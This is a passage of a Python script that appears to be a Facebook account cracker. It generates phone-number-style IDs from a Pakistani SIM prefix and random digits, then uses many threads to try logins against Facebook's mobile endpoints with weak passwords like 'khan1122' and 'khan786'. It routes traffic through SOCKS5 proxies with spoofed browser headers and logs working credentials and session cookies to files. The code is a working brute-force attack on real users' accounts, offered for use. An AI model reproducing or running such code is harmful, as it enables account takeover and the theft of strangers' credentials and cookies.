    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'khan1122']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    
def awm27():
    os.system("clear")
    print(logo)
    clear()
    
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"  \x1b[97m\033[37;40m           [ SIM - CODE - MENU ]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f"\t        \x1b[97m\033[37;40m  [EXMP]\033[0;m")
    print('\033[1;32m--------------------------------------------------------------') 
    print(f'\033[1;97m[!] \033[1;92mPAK SIM CODES \033[1;91m: \033[1;96m0303, 0302, 0301, 0305')
    print('\033[1;32m--------------------------------------------------------------') 
    code = input('\033[1;37m[\033[1;31m!\033[1;37m]\033[1;32m SIM CODE \033[1;37m: \033[1;36m')
    os.system("clear")
    print(logo)   
    print('\033[1;32m--------------------------------------------------------------') 
    limit = int(input('\033[1;90m[+]\033[1;92m EXAMPLE \033[1;91m: \033[1;96m2000, 3000, 50000, 100000\n\033[1;32m------------------------------------------------\n\033[1;97m[+]\033[1;92m PUT IDS LIMIT \033[1;91m: \033[1;96m'))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:    
        clear()
        tl = str(len(user))
        print(f"\033[1;97m[+]\033[1;92m NAME\033[1;91m                :\033[1;96m "+NameX)
        print(f"\033[1;97m[+]\033[1;92m SIM CODE YOU CHOICE\033[1;91m : \033[1;96m"+code)
        print(f"\033[1;97m[+]\033[1;92m TOTAL IDZ\033[1;91m           : \033[1;96m["+tl+"] ")
        print('\033[1;32m--------------------------------------------------------------') 
        print('    ON/OFF YOUR MOBILE DATA BEFORE USE')
        print('\033[1;32m--------------------------------------------------------------') 
        for love in user:
            uid = code+love
            pwx = [love,'khan786']
            manshera.submit(freeq,uid,pwx,tl)
    print('')
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m COMPLETED\n\033[1;97m[√] \033[1;92mYOUR OK IDS \033[1;91m: \033[1;96m'+str(len(ok))+'\n\033[1;97m[+]\033[1;92m TOTAL CP IDS \033[1;91m: \033[1;96m'+str(len(cp)))
    print('\033[1;32m--------------------------------------------------------------') 
    print('\033[1;97m[+]\033[1;92m OK IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMOK.txt\n\033[1;97m[+]\033[1;92m CP IDS SAVE \033[1;91m: \033[1;96m/sdcard/AWMCP.txt')
    input(f'\033[1;97m[+]\033[1;92m PRESS ENTER TO BACK MENU');os.system("clear");main()
    


def freeq(uid,pwx,tl):
    global loop
    global ok
    global cp
    global ugen
    try:
        for ps in pwx:
        	
            bi = random.choice([A])
            session = requests.Session()
            awml1 = ['fa-AF,fa;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.8']
            awmt2 = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
            awmc3 = ['"Android"', '"Windows"', '"Linux"']
            awmm4 = ['POST', 'GET', 'path']
            awmfetch2 = ['cros', 'navigate']
            awmdest2 = ['empty', 'document']
            awmr5 = ['https://t.facebook.com/', 'https://m.facebook.com/', 'https://p.facebook.com/', 'https://x.facebook.com/', 'https://d.facebook.com/']
            awms6 = ['"Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"', '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"', '"Google Chrome";v="108", "Not)A;Brand";v="8", "Chromium";v="108"']
            awmco7 = ['"dark"', '"light"']           
            awmram9 = ['2', '3', '4', '6', '8', '10', '12']
            awmau2 = ['m.facebook.com', 'mbasic.facebook.com', 'p.facebook.com', 'free.facebook.com']
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            pro = random.choice(ugen)   
            awml = random.choice(awml1)
            awmt = random.choice(awmt2)
            awmc = random.choice(awmc3)
            awmm = random.choice(awmm4)
            awmr = random.choice(awmr5)
            awms = random.choice(awms6)
            awmco = random.choice(awmco7)
            awmfetch = random.choice(awmfetch2)            
            awmau = random.choice(awmau2)
            awmram = random.choice(awmram9)
            free_fb = session.get('https://m.beta.facebook.com').text
            log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
			'upgrade-insecure-requests': '1',
			'viewport-width': '980',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'dnt':'1', 
			'referer': 'https://mobile.facebook.com/',
			'x-requested-with':'mark.via.gp', 
			'sec-fetch-user': '?1',
		    'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'same-origin',
			'upgrade-insecure-requests': '1',
			'accept-encoding':'gzip, deflate, br','accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Chromium";v="107", "Not)A;Brand";v="24"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
			'sec-ch-device-memory': '8',
			"sec-ch-prefers-color-scheme": '"light"',
            "user-agent": pro}
            lo = session.post('https://m.beta.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96mB-T-OK\033[1;97m]\033[1;92m '+uid+' | '+ps+  ' \n \0333Cookie = \033[1;91m'+coki+ ' \n '+pro+' \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;90mCheckpoint-B-T\033[1;97m]\033[1;93m '+uid+' | '+ps+' ')
                    open('/sdcard/CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;35m[AWM+B-T] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass 
#---------------------[END MENU]---------------------#
if __name__ == '__main__':
    main()
